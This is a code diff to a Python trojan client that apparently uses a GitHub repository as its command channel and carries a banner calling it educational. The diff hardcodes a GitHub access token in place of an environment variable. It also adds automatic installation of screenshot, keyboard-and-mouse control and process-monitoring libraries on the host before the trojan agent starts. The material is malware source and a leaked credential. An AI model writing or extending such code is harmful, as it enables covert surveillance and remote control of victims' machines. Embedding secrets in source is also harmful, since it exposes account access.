@@ -12,14 +12,36 @@ import sys
 import threading
 import time
 import os
+import subprocess
 from datetime import datetime
 from github import Github
 
 
 # Configuratie
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN") # Haal token uit environment variable voor veiligheid
+GITHUB_TOKEN = "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"
 GITHUB_REPO = "Darkknin12/trojanvirus"
 TROJAN_ID = f"trojan_{random.randint(1000, 9999)}"  # Unieke ID per client
+
+def check_dependencies():
+    """Controleer en installeer ontbrekende dependencies automatisch"""
+    dependencies = {
+        "PyGithub": "github",
+        "Pillow": "PIL",
+        "mss": "mss",
+        "psutil": "psutil",
+        "pyautogui": "pyautogui"
+    }
+    
+    for package, import_name in dependencies.items():
+        try:
+            __import__(import_name)
+        except ImportError:
+            print(f"[*] Dependency {package} ontbreekt. Installeren...")
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+                print(f"[+] {package} succesvol geïnstalleerd.")
+            except Exception as e:
+                print(f"[!] Kon {package} niet installeren: {e}")
 
 # Voor botnet ondersteuning - genereer unieke ID gebaseerd op systeem
 def genereer_unieke_id():
@@ -254,6 +276,9 @@ def main():
     print("  EDUCATIEVE TROJAN - ALLEEN VOOR LEREN!")
     print("  Test alleen in virtuele omgeving!")
     print("=" * 50)
+    
+    # Controleer dependencies voor start
+    check_dependencies()
     
     agent = TrojanAgent()
     
